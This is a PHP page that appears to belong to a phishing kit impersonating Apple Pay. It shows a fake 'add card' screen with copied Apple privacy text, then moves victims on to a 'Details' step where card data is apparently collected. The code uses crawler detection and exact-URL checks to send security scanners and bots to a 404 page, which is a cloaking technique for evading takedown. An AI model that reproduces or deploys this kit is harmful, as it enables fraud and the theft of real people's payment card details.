<?php
ob_start();
session_start();
require 'inc/functions.php';

$realCurrent = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$shouldExpect = $OUR_ROOT_LINK . 'Add?session=3878hhy78377y393i29nbn3uh84u&secure=true&time=35476432334&origin=h38y4kkj28';

if ($shouldExpect !== $realCurrent) {
  exit(header('Location: '.$OUR_404_PAGE));
}

if (checkValidBool($CrawlerDetect, $USER_AGENT) == true) {

    // Make sure our user has these sessions
    if(sessionsCheck(
      [
        ['name' => 'AllowedAccess']
      ]
    ) == false) {
        session_destroy();
        exit(header('Location: '.$OUR_ROOT_LINK));
    }
?>

<!DOCTYPE html>
<html lang="en">

<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">

  <title>Apple Pay</title>

  <!-- Bootstrap core CSS -->
  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

  <!-- Custom styles for this template -->
  <link href="css/scrolling-nav.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA==" crossorigin="anonymous" />

</head>

<body id="page-top">

  <!-- Navigation -->
  <nav class="navbar navbar-expand-lg navbar-dark fixed-top" style="background: white;" id="mainNav">
    <div class="container">
      <a class="navbar-brand js-scroll-trigger" href="#page-top" style="color: #18befc; margin-left: 15px;">Cancel</a>
        
      <button class="" style="float: right!important; background: none; border: none;" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
       
      </button>

    </div>
  </nav>

  <header class="bg-primary text-white" style="background: url(img/back.jpg); margin-top: 47px; background-repeat:no-repeat; background-size:cover; min-height: 400px; background-position: center; max-height: 400px;">
    <div class="container text-center">
      <h1></h1>
      <p class="lead"></p>
    </div>
  </header>

  <section id="about">
    <div class="container">
      <center>
      <div class="row" style="width: 95%;">
        <div class="col-lg-7 mx-auto">
          <h5 style="font-size: 22px; text-align: center;">Add credit, debit or store cards to Apple Pay to make secure in apps, on the web and in shops using NFC.</h5>
          <div style="margin-top: 20px;">
            <form method="POST">
              <center><img src="img/shake.png" alt="hand shake" /></center>
              <p style="text-align: center;">Card-related information, location, and information about device settings and use patterns will be sent to Apple and may be shared together with account information with your card issuer or bank to set up Apple Pay.<br><a href="">See how your data is managed...</a></p>
              <button class="btn btn-primary btn-block" type="submit" name="nextadd" style="border-radius: 10px;">Continue</button>
            </form>
          </div>

          <?php
              if(isset($_POST['nextadd'])) {
                  setSessions(
                    [
                      ['name' => 'PastLogin', 'val' => 'true']
                    ]
                  );
                  exit(header('Location: Details?sesh=43mdsij923932i4kdsfjij843u9&secure=true&active=5&time=4336545632122&ua=3j8h4iuhju48'));
              }
          ?>

        </div>
      </div>
      </center>
    </div>
  </section>

  <!-- Bootstrap core JavaScript -->
  <script src="vendor/jquery/jquery.min.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

  <!-- Plugin JavaScript -->
  <script src="vendor/jquery-easing/jquery.easing.min.js"></script>

  <!-- Custom JavaScript for this theme -->
  <script src="js/scrolling-nav.js"></script>

</body>

</html>
<?php
} else {
    exit(header('Location: ' . $OUR_404_PAGE));
}
ob_end_flush();
?>
